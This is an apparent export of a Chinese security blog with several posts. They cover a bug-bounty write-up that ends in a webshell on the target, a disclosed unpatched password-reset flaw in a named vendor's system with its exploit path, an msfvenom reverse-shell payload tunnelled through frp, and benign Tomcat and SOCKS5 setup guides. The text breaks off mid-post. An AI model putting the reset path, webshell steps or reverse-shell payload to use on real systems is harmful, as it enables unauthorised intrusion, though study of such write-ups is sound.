alt="在这里插入图片描述"></p><p>​然后改包进入，居然可以随便点点点了，不再去闪退到登录。</p><p>​点击这个查看活动</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/14.png" alt="在这里插入图片描述"></p><p>​</p><p>​抓包，看到我添加的token&#x3D;yydz了</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/15.png" alt="在这里插入图片描述"></p><p>​看一下返回包，触发闪退，这里和前面的猜测差不多，触发功能点时再去验证token的正确与否</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/16.png" alt="在这里插入图片描述"></p><p>​显然错误的token会提示未登录，返回值是1就直接闪退到登录界面，所以改0 留下来</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/17.png" alt="在这里插入图片描述"></p><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>​上传一个html</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/18.png" alt="在这里插入图片描述"></p><p>​成功了</p><p>​访问返回的路径就可以了</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/19.png" alt="在这里插入图片描述"></p><p>​接着上传一个phpinfo()试试，为什么是php，因为前面的指纹信息已经告诉了 ，以及返回包的apache信息</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/20.png" alt="在这里插入图片描述"></p><p>​看一眼禁用函数</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/21.png" alt="在这里插入图片描述"></p><p>​头晕这种，这个时候哥斯拉就用上了</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/22.png" alt="在这里插入图片描述"></p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/23.png" alt="在这里插入图片描述"></p><p>​连接</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/24.png" alt="在这里插入图片描述"></p><p>​直接getshell，有着很多的信息，貌似规模非常的大，这里就不继续横向了，点到为止</p><p>​然后换证书的时候…这下白忙活了，怪我当时没细心看兑换限制，只能换个别的咯</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/25.png" alt="在这里插入图片描述"></p><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><ul><li>首先就是运气成分</li><li>还有就是多试一试，不要去感觉这没有那没有，试了就有成功的可能，别嫌麻烦</li><li>然后利用Vue这种框架的一些特性，前端决定的信息太多，结合js多多分析。</li><li>最后就是多多实战，积累经验</li></ul><h2 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>又一个在野0day</title>
      <link href="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/"/>
      <url>/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/</url>
      
        <content type="html"><![CDATA[<p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="一个在野0day"><a href="#一个在野0day" class="headerlink" title="一个在野0day"></a>一个在野0day</h2><p>找不到厂商，貌似这个厂商倒闭了</p><p>厂商：北京康邦科技有限公司统一管理系统</p><p>发现过程：<strong>还是抓包分析分析再分析</strong></p><p>因为忘了截图，大概描述一下：</p><p>一直抓包看http历史，结合js，它不同的数字对应不同的路径，那些路径访问后直接跳转，但是，当用户名是正确的时候，也就是第二步，核实了有这个用户名，为啥这样发现的呢，因为cookie有一处细节，输入正常用户的cookie比错误用户名要长度要长(多了一个键值对)，就可以直接访问那个路径，因此触发了任意密码重置</p><h3 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h3><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/1.png" alt="image-20240322112103611"></p><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/2.png" alt="image-20240322112120187"></p><p>​</p><p>​注意这里 输入admin之后，点击了继续之后！</p><p>​再通过根路径拼接访问 <code>uum/users_selfService!isCorrect.action</code> 直接访问更改密码路径</p><p>​选择存在的账号更改即可</p><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/3.png" alt="image-20240322112300644"></p><p>然后用更改好的登录即可</p><p><img src="/2023/03/07/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/4.png" alt="image-20240322112511406"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一些src实战记录</title>
      <link href="/2023/01/15/%E4%B8%80%E4%BA%9Bsrc%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/01/15/%E4%B8%80%E4%BA%9Bsrc%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-感慨"><a href="#前言-感慨" class="headerlink" title="前言&amp;感慨"></a>前言&amp;感慨</h2><p>不知不觉中，接触这门技术，已经就要三年了</p><p>可以说技术让我重生，又来了主动学习与思考反思</p><p>这三年我不管学的多学的少，日拱一卒，没有一天停止学习，只不过效率太低，似乎别人一个星期就抵我一个月学的，为此我付出了很多时间</p><p>虽然现在很菜，套模板挖洞，没什么技术含量，但我坚信 以后绝不止这些</p><p>在这三年的过程中，我特别感谢三个人</p><p>一位是我的高中老师，在我迷茫与无知的时候，向我讲述了黑客技术与CTF</p><p>一位是F_Dao师傅，对我入门以及学习期间的指导与规划</p><p>一位是j0o1ey师傅，偶像与风向标生</p><p>后面没特别情况就准备放弃挖src一段时间，学其他方向了</p><p>思考之后，我准备把自己挖src保留下的报告共享</p><p>我以为漏洞平台会一直保存，但不知道过了半个月他们就会将漏洞细节删除，导致现在很多案例遗失</p><p>帮助大家，就像很多师傅无条件帮助我一样</p><p>希望大家也都保持善良，对待求知若渴虚心若愚的同学，可以伸出援助之手，做一个善良的人</p><p>链接：<a href="https://q1al4.lanzout.com/ieVpQ1s6sscj">https://q1al4.lanzout.com/ieVpQ1s6sscj</a></p><p>大概有80多个案例</p><p><img src="/2023/01/15/%E4%B8%80%E4%BA%9Bsrc%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/img/1.png" alt="image-20240322104906665"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解析HTTP请求header错误</title>
      <link href="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/"/>
      <url>/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><h3 id="windows下tomcat启动但无法访问localhost的问题"><a href="#windows下tomcat启动但无法访问localhost的问题" class="headerlink" title="windows下tomcat启动但无法访问localhost的问题"></a>windows下tomcat启动但无法访问localhost的问题</h3><ul><li>环境变量一切正常</li><li>127.0.0.1可以访问，内网ip可以访问</li></ul><p>这个方法<em>不用改源码，不用改项目，不用重装，不用改端口！</em></p><p>希望可以帮到解决问题的朋友和师傅们</p><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><h5 id="访问错误："><a href="#访问错误：" class="headerlink" title="访问错误："></a><strong>访问错误：</strong></h5><p>​<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/1.png" alt="在这里插入图片描述"></p><h5 id="报错内容："><a href="#报错内容：" class="headerlink" title="报错内容："></a><strong>报错内容</strong>：</h5><p>​logs报错信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>-Nov-<span class="number">2022</span> <span class="number">17</span>:<span class="number">19</span>:<span class="number">26.972</span> 信息 [http-nio-<span class="number">8080</span>-exec-<span class="number">1</span>] org.apache.coyote.http11.Http11Processor.service 解析 HTTP 请求 header 错误</span><br><span class="line"> 注意：HTTP请求解析错误的进一步发生将记录在DEBUG级别。</span><br><span class="line">java.lang.IllegalArgumentException: 在方法名称[0x160x030x010x020x000x010x000x010xfc0x030x030xf10x150x81/<span class="number">0xb9</span>?0x990x8fsn40xbf?0x010x1eU3u0xbd0xcb0xe4q0xbeu0xb70x180xccJj0xc50xe70xde ]中发现无效的字符串, HTTP 方法名必须是有效的符号.</span><br><span class="line">at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:<span class="number">434</span>)</span><br><span class="line">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:<span class="number">513</span>)</span><br><span class="line">at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:<span class="number">65</span>)</span><br><span class="line">at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:<span class="number">885</span>)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:<span class="number">1693</span>)</span><br><span class="line">at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:<span class="number">49</span>)</span><br><span class="line">at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:<span class="number">1191</span>)</span><br><span class="line">at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:<span class="number">659</span>)</span><br><span class="line">at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:<span class="number">61</span>)</span><br><span class="line">at java.lang.Thread.run(Unknown Source)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>终端报错信息</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/2.png" alt="在这里插入图片描述"></p><h5 id="问题核心："><a href="#问题核心：" class="headerlink" title="问题核心："></a>问题核心：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.coyote.http11.Http11Processor.service 解析 HTTP 请求 header 错误</span><br><span class="line"> 注意：HTTP请求解析错误的进一步发生将记录在DEBUG级别。</span><br><span class="line">java.lang.IllegalArgumentException: 在方法名称[0x160x030x010x020x000x010x000x010xfc0x030x030xf10x150x81/<span class="number">0xb9</span>?0x990x8fsn40xbf?0x010x1eU3u0xbd0xcb0xe4q0xbeu0xb70x180xccJj0xc50xe70xde ]中发现无效的字符串, HTTP 方法名必须是有效的符号.</span><br></pre></td></tr></table></figure><p>使用127.0.0.1:8080访问</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/3.png" alt="在这里插入图片描述"></p><p>使用内网ip访问</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/4.png" alt="在这里插入图片描述"></p><p><strong>单单localhost不能访问，但是其他可以成功访问，怀着不逃避问题的心态，自己摸索好久，借助各类翻车的经验，以及搜索引擎的内容，终于解决:</strong></p><h5 id="解决流程："><a href="#解决流程：" class="headerlink" title="解决流程："></a>解决流程：</h5><p>​注意观察访问成功的url信息</p><p>​<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/5.png" alt="在这里插入图片描述"><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/6.png" alt="在这里插入图片描述"></p><p>​失败的localhost他是</p><p>​<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/7.png" alt="在这里插入图片描述"></p><p>得出结论：<strong>使用http访问</strong>！！</p><p>然后又是坑<img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/8.png" alt="在这里插入图片描述"></p><p>这里有一个小细节，加载出了ico，说明是可以访问的，但是点击之后</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/9.png" alt="在这里插入图片描述"></p><p>自动加入了https<br>试了好多次 输入http一直跳转https</p><p>经过我无数次采坑与学习 整合各种文章，得出办法！</p><p><strong>访问谷歌的 chrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</strong></p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/10.png" alt="在这里插入图片描述"></p><p>在这里的意思是说 对站点安全策略的保护，默认localhost拥有ssl保护<br>然后输入localhost删掉就好了</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/11.png" alt="在这里插入图片描述"></p><p>成功</p><p><img src="/2022/11/22/%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82header%E9%94%99%E8%AF%AF/img/12.png" alt="在这里插入图片描述"></p><p>tip:遇到浏览器访问这块的问题，包括渗透测试方面，多换几个浏览器访问试试</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h3>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu搭建Socks5代理服务器</title>
      <link href="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="使用Ubuntu搭建Socks5代理服务器"><a href="#使用Ubuntu搭建Socks5代理服务器" class="headerlink" title="使用Ubuntu搭建Socks5代理服务器"></a>使用Ubuntu搭建Socks5代理服务器</h3><p>​国内vps做教程，请遵守我国互联网法律法规，切勿使用本教程研究非法网络活动，如有，博主不承担任何责任。</p><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>​使用到的工具</p><ul><li><p>VPS</p></li><li><p>Dante</p></li><li><p>Proxifier</p></li></ul><h5 id="安装dante"><a href="#安装dante" class="headerlink" title="安装dante"></a>安装dante</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install dante-server</span><br></pre></td></tr></table></figure><h5 id="配置dante"><a href="#配置dante" class="headerlink" title="配置dante"></a>配置dante</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/danted.conf</span><br></pre></td></tr></table></figure><p>建议最好提前先备份一下</p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/1.png" alt="img"></p><p>这个文件270行，非常的多，需要一点点分析其中关于配置的内容</p><p>建议全删了vi命令 <code>：1,%d</code>，去找一份然后翻译修改<br>结合参考文件和百度，需要如下地方做出整改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">logoutput: /var/log/socks.log</span><br><span class="line">internal: &lt;vps的上网的网卡&gt; port = 连接时的端口</span><br><span class="line">external: &lt;vps的上网的网卡&gt;</span><br><span class="line">clientmethod: none</span><br><span class="line">socksmethod: username</span><br><span class="line">user.privileged: root</span><br><span class="line">user.notprivileged: &lt;连接时的使用的用户名&gt;</span><br><span class="line"></span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        log: error connect disconnect</span><br><span class="line">&#125;</span><br><span class="line">client block &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        log: connect error</span><br><span class="line">&#125;</span><br><span class="line">socks pass &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        command: bind connect udpassociate</span><br><span class="line">        log: error connect disconnect</span><br><span class="line">        socksmethod: username</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123;</span><br><span class="line">        from: 0.0.0.0/0 to: 0.0.0.0/0</span><br><span class="line">        log: connect error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.notprivileged中不建议使用系统登录的账户，为了安全起见，新建一个专门用户连接socks5的用户</p><p><img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/2.png" alt="2"></p><p>接着去设置密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd px </span><br></pre></td></tr></table></figure><p>之后去修改&#x2F;etc&#x2F;passwd文件，禁止这个账户登录系统(安全起见)</p><p><img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/3.png" alt="在这里插入图片描述"></p><p>测试效果</p><p><img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/4.png" alt="在这里插入图片描述"></p><p>成功无法登录</p><h5 id="测试与使用"><a href="#测试与使用" class="headerlink" title="测试与使用"></a>测试与使用</h5><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/5.png" alt="在这里插入图片描述"></p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/6.png" alt="在这里插入图片描述"></p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/7.png" alt="在这里插入图片描述"></p><p>​到这里就成功了。</p><p>​去使用Proxifier连接即可使用</p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/8.png" alt="在这里插入图片描述"></p><p>​<strong>Address是我这台机器的外网ip，如果你的vps ip不止一个，可以在dante的conf文件中可以去指定网卡选择不同的ip使用。</strong></p><p><strong>check一下</strong></p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/9.png" alt="在这里插入图片描述"></p><p>​到这里注意是卡死的，因为测试时Proxifier访问google了，我这台机器是北京的，懂得都懂。</p><p>​直接OK下一步</p><p>​<img src="/2022/10/30/Ubuntu%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/img/10.png" alt="在这里插入图片描述"></p><p>​成功。后面的扩展使用，就不赘述了，只需要利用Proxifier指定不同的程序代理流量就好了，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考，感谢：</span><br><span class="line">https://www.baidu.com/</span><br><span class="line">http://wiki.kartbuilding.net/Dante_Socks_Server</span><br><span class="line">https://www.cnblogs.com/zhangjiagang/p/15169572.html</span><br><span class="line">https://www.keepnight.com/archives/657/</span><br></pre></td></tr></table></figure><h4 id="end"><a href="#end" class="headerlink" title="end"></a>end</h4>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网MSF接收反向shell(突发奇想的实验)</title>
      <link href="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/"/>
      <url>/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="关于处于内网环境的MSF接收反向连接shell"><a href="#关于处于内网环境的MSF接收反向连接shell" class="headerlink" title="关于处于内网环境的MSF接收反向连接shell"></a>关于处于内网环境的MSF接收反向连接shell</h3><p>​内网渗透两位主流工具无非cs与msf，CobaltStrike与Metasploit不一样，cs架构的它teamserver直接部署在外网ip上，做攻击使用连接方便，而msf没有。</p><p>​另一方面，对一部分人来说，这种方法的作用某种情况下确确实实是多余的，可能是我的学习方式跟大家不大相同，<strong>刹那间的突发奇想，自己也就研究了一下</strong>，也是希望能帮助到想到这个问题的小伙伴。</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li><p>大家的MSF也几乎都是处于虚拟机中的内网环境，攻击的用处也大都是和cobaltstrike传递shell做后渗透。</p></li><li><p>但是，当我们的<strong>主动攻击</strong>目标是外网机器，或者说是不同且不通的内网环境，<strong>这种情况，我们该如何去接收反向的shell连接</strong>呢。</p><p><strong>网上搜索关于msf教程，也通常都是在内网中做的演示</strong>，但是在<strong>渗透过程中不乏会遇到需要利用msf的exploit进行漏洞利用的过程</strong>，本文应运而生，文章创作目的意在帮助需要的小伙伴。</p></li></ul><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><p>核心在于流量转发，使用到的工具</p><ul><li>frp</li><li>独立公网IP的vps</li><li>xshell</li><li>蚁剑</li></ul><h5 id="frp配置、"><a href="#frp配置、" class="headerlink" title="frp配置、"></a>frp配置、</h5><p>​frp的配置，使其可以互通</p><p>​首先在内网kali和自己的vps上下载好frp，没钱买vps就去用提供端口转发的第三方服务，网上太多了。</p><p><img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/1.png" alt="在这里插入图片描述"></p><p>​简单配置一下</p><p>​vps：frps配置</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/2.png" alt="在这里插入图片描述"></p><p>​内网kali：frpc配置</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/3.png" alt="在这里插入图片描述"></p><p>​连接vps的7000端口通信，并且把本地的2222端口映射到vps的8000端口</p><p>​接下来测试一下连通性：</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/4.png" alt="在这里插入图片描述"></p><p>​连通是成功的</p><p>​注意：如果遇到ping通可以，但是nc不能通信，大家可以多换一个端口尝试</p><p>​</p><h5 id="木马生成、"><a href="#木马生成、" class="headerlink" title="木马生成、"></a>木马生成、</h5><p>​生成msf的木马</p><p>​最简单的命令生成一个</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=外网IP LPORT=外网端口 -f elf &gt; /test/shell.elf</span><br></pre></td></tr></table></figure><p>​留意这个监听payload：<code>linux/x64/meterpreter/reverse_tcp</code></p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/5.png" alt="在这里插入图片描述"></p><p>​之后把shell.elf下载到本地，再通过蚁剑上传到目标机器</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/6.png" alt="在这里插入图片描述"></p><p>​</p><h5 id="流量转发、"><a href="#流量转发、" class="headerlink" title="流量转发、"></a>流量转发、</h5><p>​启动frp进行流量转发</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/7.png" alt="在这里插入图片描述"></p><h5 id="测试上线、"><a href="#测试上线、" class="headerlink" title="测试上线、"></a>测试上线、</h5><p>​开启msf的监听，等待上线</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/8.png" alt="在这里插入图片描述"></p><p>​这个时候注意默认的payload，是跟我们生成木马时使用的不一样，<strong>原则上用什么监听模式生成木马，就用什么监听模式接受反弹shell</strong>，所以要改成一样的。</p><p>​<img src="/2022/10/27/%E5%86%85%E7%BD%91MSF%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%90%91shell(%E7%AA%81%E5%8F%91%E5%A5%87%E6%83%B3%E7%9A%84%E5%AE%9E%E9%AA%8C)/img/9.png" alt="在这里插入图片描述"></p><p>​我们选择监听本地，之所以是2222端口，因为我们前面讲到转发的本地端口是2222</p><p>​<img 